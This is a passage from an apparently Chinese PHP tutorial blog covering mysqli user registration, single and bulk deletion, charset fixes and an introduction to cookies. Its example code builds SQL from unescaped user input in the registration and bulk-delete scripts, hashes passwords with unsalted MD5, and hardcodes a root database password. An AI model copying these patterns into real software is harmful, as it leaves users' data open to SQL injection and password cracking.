<td align="left">mysqli_close(link_identifier)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">关闭数据库连接</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功则返回 true，失败则返回 false。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="red" face="Comic sans MS"><strong>其他：显示服务器信息函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_get_server_info</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">返回服务器信息</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_get_server_version</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">返回服务器版本</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font><br>mysqli只学过程化的方法即可。在面向对象阶段实际工作中完全抛弃了mysqli的对象用法，而是使用的是PDO对象连接数据库的方式。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-通过步骤做一个用户注册实例"><a href="#二-通过步骤做一个用户注册实例" class="headerlink" title="二. 通过步骤做一个用户注册实例"></a><font color="#FF6347" face="Comic sans MS">二. 通过步骤做一个用户注册实例</font></h3><blockquote>
<p><font color="#FF7F00"><strong>我们做一个最简单的注册页面。注册页面中有三个参数：</strong></font></p>
</blockquote>
<ol>
<li>用户名</li>
<li>密码</li>
<li>重复密码</li>
</ol>
<ul>
<li>用户写好三个参数后，点击提交的时候向<code>connect.php</code>页面中传入POST记录。</li>
<li>我们可以把<code>POST记录</code>处理后写入到MySQL数据库中，即完成了用户注。</li>
</ul>
<blockquote>
<p><font color="#FF7F00"><strong>本例用到的两个文件：</strong></font></p>
</blockquote>
<ol>
<li><code>index.php</code>：表单页面；</li>
<li><code>connect.php</code>：处理表单的页面。</li>
</ol>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>一、 判断重复密码：</strong></font></p>
<blockquote>
<p>1.<strong>由于有重复密码，</strong><font color="#FF7F00"><strong>如果用户两次输入的密码不一致也就是有没有进行下一步的任何意义。</strong></font><br>2.<font color="#FF7F00"><strong>在网页中很多地方还是使用到了重复密码。</strong></font><strong>因为，害怕的是用户产生手误。将密码填写出错。</strong><br>3.<font color="#FF7F00"><strong>用户在输入密码的时候可能在左右两边多打两个空格。因此，我们会使用trim将密码和重复密码的两边去掉空格。</strong></font></p>
</blockquote>
<p>&amp;emsp;<br>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) != trim(<span class="variable">$_POST</span>[<span class="string">&#x27;repassword&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;两次密码不一致,请返回上一页&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>二、 准备好写入的数据：</strong></font><br>我们需要把用户的<strong>输入数据</strong>和<strong>隐藏的数据</strong>都写入到数据库。</p>
<p><font color="red"><strong>可见数据有：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_POST[‘username’]</td>
<td align="left">用户名</td>
</tr>
<tr>
<td align="center">$_POST[‘password’]</td>
<td align="left">密码</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>我们需要把用户名去掉两边的空格，这样避免输入不必要的这些信息。</li>
<li>在mysql这一章节我们讲过，用户的密码不要让包括公司内部人员可见。保证密码是不可逆向的。在初级阶段大家学习一下MD5即可。以后我们再教大家其他的加密方式。</li>
</ol>
</blockquote>
<p><font color="red"><strong>不可见数据有：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$time</td>
<td align="left">用户的注册时间</td>
</tr>
<tr>
<td align="center">$_SERVER[‘REMOTE_ADDR’]</td>
<td align="left">用户的注册IP</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>time返回的unix时间戳</li>
<li>REMOTE_ADDR返回的是IP地址，我们可以用ip2long将其转为整型存储。</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = md5(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="variable">$time</span> = time();</span><br><span class="line"><span class="variable">$ip</span> = ip2long(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、连接数据库、判断错误、选择库和字符集：</strong></font></p>
<blockquote>
<ol>
<li>我们使用mysqli_connect连接到数据库服务器。</li>
<li>如果有错误，使用mysqli_errno得到错误号</li>
<li>如何时存在错误mysqli_error打印出所有的错误，并且退出程序执行</li>
<li>选择数据库并且设置字符集为utf8.</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;liwenkaihaha&#x27;</span>);</span><br><span class="line"><span class="comment">//如果有错误，存在错误号</span></span><br><span class="line"><span class="keyword">if</span>(mysqli_errno(<span class="variable">$conn</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择数据库</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="comment">//选择字符集</span></span><br><span class="line">mysqli_set_charset(<span class="variable">$conn</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、组合SQL语句：</strong></font><br>我们需要把得到的信息写入到数据库里面去，用户名、密码、创建时间、IP我们都得到了。</p>
<p>将对应的变量插入到SQL语句中即可。组合出来的SQL语句如下：<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username,password,createtime,createip) values(&#x27;&quot;</span> . <span class="variable">$username</span> . <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">,&#x27;&quot;</span> . <span class="variable">$password</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$ip</span> . <span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>而我们的创建表的语句如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="keyword">IF</span> NOT EXISTS user (</span><br><span class="line">id <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">username varchar(<span class="number">30</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">password char(<span class="number">32</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">createtime <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">createip <span class="keyword">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>表的格式（字段对应说明）：<br><font color="#00B2EE"></font></p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">username</th>
<th align="center">password</th>
<th align="center">createtime</th>
<th align="center">createip</th>
</tr>
</thead>
<tbody><tr>
<td align="center">用户编号</td>
<td align="center">用户名</td>
<td align="center">密码</td>
<td align="center">创建时间</td>
<td align="center">创建IP</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、发送语句，判断状态：</strong></font></p>
<blockquote>
<p>mysqli_query我们在上面说过，需要传入两个参数：</p>
</blockquote>
<ol>
<li>连接的资源，在这里对应的变量是$conn。</li>
<li>发送的SQL语句。在上面已经准备好了$sql。</li>
</ol>
<blockquote>
<p>SQL语句可以通过mysqli_query发送给MySQL服务器。发送成功$result则为true。否则为false。<br>成功的话，我们就可以提示用户注册成功啦。<br>有些情况下，可能还需要使用到**mysqli_insert_id()**。功能是获取上面通过insert插入数据的id并返回这个id。<br>mysqli_insert_id应用场景：新加的一个行的数据。我们需要得到自动增长的ID值，将这个ID值插入到另外一个表里面去时。就需要用到这个函数。</p>
</blockquote>
<p>&amp;emsp;</p>
<p><code>mysqli_insert_id()</code>使用举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;注册成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;注册失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前用户插入的ID为&#x27;</span>.mysqli_insert_id(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>六、关闭数据库连接：</strong></font></p>
<p>将资源变量传到到mysqli_close这个函数里面即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>先建立test数据库、user数据表。数据表建立语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="keyword">IF</span> NOT EXISTS user (id <span class="keyword">int</span>(<span class="number">11</span>) PRIMARY KEY AUTO_INCREMENT,username varchar(<span class="number">30</span>) NOT <span class="literal">NULL</span>,password char(<span class="number">32</span>) NOT <span class="literal">NULL</span>,createtime <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,createip varchar(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br><font color="red"><strong>1. <code>index.php</code>表单页面：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;connect.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    重复密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;repassword&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;<br><font color="red"><strong>2. <code>connect.php</code>页面完整代码：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) != trim(<span class="variable">$_POST</span>[<span class="string">&#x27;repassword&#x27;</span>])) &#123;</span><br><span class="line">   <span class="keyword">exit</span>(<span class="string">&#x27;两次密码不一致,请返回上一页&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = md5(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="variable">$time</span> = time();</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo $username.&quot;/&quot;.$password.&quot;/&quot;.$time.&quot;/&quot;.$ip;</span></span><br><span class="line"><span class="comment">//如果有错误，存在错误号</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_errno(<span class="variable">$conn</span>)) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">mysqli_set_charset(<span class="variable">$conn</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username,password,createtime,createip) values (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;失败&#x27;</span>;</span><br><span class="line">   var_dump(<span class="string">&quot;错误为：&quot;</span>.mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">   var_dump(<span class="string">&quot;返回值：&quot;</span>.<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前用户插入的ID为&#x27;</span> . mysqli_insert_id(<span class="variable">$conn</span>);</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-通过步骤做一个列表显示实例"><a href="#三-通过步骤做一个列表显示实例" class="headerlink" title="三. 通过步骤做一个列表显示实例"></a><font color="#FF6347" face="Comic sans MS">三. 通过步骤做一个列表显示实例</font></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1262.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4977.html">视频</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-通过步骤操作之把用户做个分页"><a href="#四-通过步骤操作之把用户做个分页" class="headerlink" title="四. 通过步骤操作之把用户做个分页"></a><font color="#FF6347" face="Comic sans MS">四. 通过步骤操作之把用户做个分页</font></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1273.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4978.html">视频</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-批量和指定删除用户"><a href="#五-批量和指定删除用户" class="headerlink" title="五.  批量和指定删除用户"></a><font color="#FF6347" face="Comic sans MS">五.  批量和指定删除用户</font></h3><p>上面已经学过了通过步骤做一个列表显示，在删除前，<font color="#FF7F00"><strong>有单行删除数据和删除多行数据</strong></font>。</p>
<p>&amp;emsp;</p>
<h4 id="5-1-判断是单选还是多选删除"><a href="#5-1-判断是单选还是多选删除" class="headerlink" title="5.1 判断是单选还是多选删除"></a><font color="#3CB371" face="Comic sans MS">5.1 判断是单选还是多选删除</font></h4><blockquote>
<ol>
<li><font color="#FF7F00"><strong>单行是通过get传参的方式</strong></font>向delete.php文件中写上对应的ID。</li>
<li>而<font color="#FF7F00"><strong>多个删除是通过POST的方式</strong></font>向delete.php页面中传递对应的ID。</li>
<li>如果这两个都不符合的话，那我们可以视为数据不合法。</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = join(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据不合法&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="5-2-组合SQL语句"><a href="#5-2-组合SQL语句" class="headerlink" title="5.2 组合SQL语句"></a><font color="#3CB371" face="Comic sans MS">5.2 组合SQL语句</font></h4><blockquote>
<ol>
<li>MySQL这一章讲解过<font color="#FF7F00"><strong>删除时可以使用到in的子语句</strong></font>。</li>
<li>同样在这里，我们就可以用in的子语句来达到效果。</li>
<li><font color="#FF7F00"><strong>join函数将多选删除传过来的id变为了3,4,5的格式</strong></font>，最终多选删除的SQL语句执行出来的效果就是：</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> user where id in(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>而单选删除的语句效果就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> user where id in(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>这样我们就实现了单选和多选自适应效果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where id in(<span class="subst">$id</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>最终配套而成的整体代码演示如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;connection.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$id</span> = join(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;数据不合法&#x27;</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where id in(<span class="subst">$id</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;删除成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;删除失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="六-通过步骤修改用户信息"><a href="#六-通过步骤修改用户信息" class="headerlink" title="六. 通过步骤修改用户信息"></a><font color="#FF6347" face="Comic sans MS">六. 通过步骤修改用户信息</font></h3><p>内容有点多，等哪天想起来了或者心情好了再写吧…..(✿◡‿◡)</p>
<p><font color="#00B2EE">[<a href="http://www.php.cn/code/1277.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4980.html">视频</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="七-数据显示乱码终极解决办法"><a href="#七-数据显示乱码终极解决办法" class="headerlink" title="七. 数据显示乱码终极解决办法"></a><font color="#FF6347" face="Comic sans MS">七. 数据显示乱码终极解决办法</font></h3><p>解决乱码问题的核心思想，就是：<font color="#FF7F00"><strong>一定要多个不同的文件系统中一定要统一编码</strong></font>。</p>
<p>&amp;emsp;<br>总结成了9个要点来彻底解决连接后乱码的问题。</p>
<blockquote>
<ol>
<li><font color="#00B2EE"><strong>html编码与MySQL编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>PHP编码与MySQL编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>若有header头发送字符集，请与数据库一样</strong></font></li>
<li><font color="#00B2EE"><strong>&lt;meta http-equiv&#x3D;“Content-Type”content&#x3D;“text&#x2F;html; charset&#x3D;utf-8” &#x2F;&gt;要和页面的文字编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>数据库建库的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>表的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>列的字符集要统一(表设了,列就默认写表的)</strong></font></li>
<li><font color="#00B2EE"><strong>连接,校验的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>结果集的字符集要统一</strong></font></li>
</ol>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br><font color="#FF7F00"><strong>一、 文件编码</strong></font><br>html和PHP文件的编码，示例中：拿notepad++来演示。将PHP和html都要设为这种字符集。<br>一定要设置为utf-8无BOM格式。</p>
<p><img data-src="https://i.loli.net/2019/02/24/5c72764c43d27.png" alt="1"></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>二、 header头编码</strong></font><br>如果php中有header头，一定要是<strong>utf-8</strong>的<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#FF7F00"><strong>三、网页头文件编码</strong></font><br>如果html文件编码是utf-8的也要设置为一置<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-<span class="number">8</span>” /&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#FF7F00"><strong>四、创建数据库的编码</strong></font></p>
<p><img data-src="https://i.loli.net/2019/02/24/5c72789c325a2.png" alt="2"></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>五、表和列创建的时候表为utf-8</strong></font></p>
<p><img data-src="https://i.loli.net/2019/02/24/5c7278e24b5ad.png" alt="3.png"></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>六、连接，结果、校验字符集设置</strong></font></p>
<blockquote>
<p><font color="#00B2EE"><strong>1.通过mysqli_set_charset(‘utf8’)来MySQL连接、结果和校验的字符集设置。<br>2.注：数据库的字符集声明和文件中的略有不同。</strong></font><font color="red"><strong>utf8为mysql数据库的，utf-8为文件中使用的。</strong></font></p>
</blockquote>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-会话管理和控制</title>
    <url>/post/PHP-SessionManagement/</url>
    <content><![CDATA[<p>(。・∀・)ノ</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 会话管理和控制</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a><font color="#FF6347" face="Comic sans MS">一. 前言</font></h3><p>标准的http协议是无状态的，无连接的。<br>？？？什么意思？⊙﹏⊙∥</p>
<blockquote>
<p><strong>【无状态】</strong></p>
</blockquote>
<ol>
<li>协议对于事务处理没有记忆能力【事物处理】【记忆能力】</li>
<li>对同一个url请求没有上下文关系【上下文关系】</li>
<li>每次的请求都是独立的，它的执行情况和结果与前面的请求和之后的请求是无直接关系的，它不会受前面的请求应答情况直接影响，也不会直接影响后面的请求应答情况【无直接联系】【受直接影响】</li>
<li>服务器中没有保存客户端的状态，客户端必须每次带上自己的状态去请求服务器【状态】</li>
</ol>
<blockquote>
<p><strong>【无连接】</strong></p>
</blockquote>
<ol>
<li>每一个访问都是无连接，服务器挨个处理访问队列里的访问，处理完一个就关闭连接，这事儿就完了，然后处理下一个新的</li>
<li>无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接</li>
</ol>
<p>&amp;emsp;<br>具体内容以及为什么使用Session和Cookie参考下面博文：<br><font color="#00B2EE">[<a href="https://www.cnblogs.com/bellkosmos/p/5237146.html">http协议无状态中的 “状态” 到底指的是什么？！</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-Cookie概述"><a href="#二-Cookie概述" class="headerlink" title="二. Cookie概述"></a><font color="#FF6347" face="Comic sans MS">二. Cookie概述</font></h3><p>什么是Cookie？<br>请参考本站博客<font color="#00B2EE">[<a href="https://directoree.github.io/post/HTTP-User-Agen-Cookie">HTTP协议请求头部的User-Agen和Cookie</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-PHP中的Cookie"><a href="#三-PHP中的Cookie" class="headerlink" title="三. PHP中的Cookie"></a><font color="#FF6347" face="Comic sans MS">三. PHP中的Cookie</font></h3><p><strong>这节我们通过一个用户首次登陆网站后，再次访问不需要重复输入用户名和密码的例子来学习Cookie。</strong><br><font face="Comic sans MS">php中提供了一个函数来让我们设置cookie，这个函数是：<font color="#FF7F00">bool setcookie()</font>;<br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp">PHP setcookie() 函数</a>]</font><br>需要注意的是，这个函数每次只能设置Cookie中的一个参数，比如一次只能设置用户名、密码等字段。</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> setcookie  (</span><br><span class="line">        <span class="keyword">string</span> $名字</span><br><span class="line">        [, <span class="keyword">string</span> $值]</span><br><span class="line">        [, <span class="keyword">int</span> $过期时间  = <span class="number">0</span>]</span><br><span class="line">        [, <span class="keyword">string</span> $路径]</span><br><span class="line">        [, <span class="keyword">string</span> $域名]</span><br><span class="line">        [, <span class="keyword">bool</span> $安全  = <span class="literal">false</span>]</span><br><span class="line">        [, <span class="keyword">bool</span> <span class="variable">$http</span>只读  = <span class="literal">false</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$名字</td>
<td align="left">必需。规定 cookie 的名称。</td>
</tr>
<tr>
<td align="center">$值</td>
<td align="left">可选。规定 cookie 的值。</td>
</tr>
<tr>
<td align="center">$有效期</td>
<td align="left">可选。规定 cookie 的有效期。</td>
</tr>
<tr>
<td align="center">$路径</td>
<td align="left">可选。规定 cookie 的服务器路径。</td>
</tr>
<tr>
<td align="center">$域名</td>
<td align="left">可选。规定 cookie 的域名。</td>
</tr>
<tr>
<td align="center">$安全</td>
<td align="left">可选。规定是否通过安全的 HTTPS 连接来传输 cookie。</td>
</tr>
<tr>
<td align="center">$http只读</td>
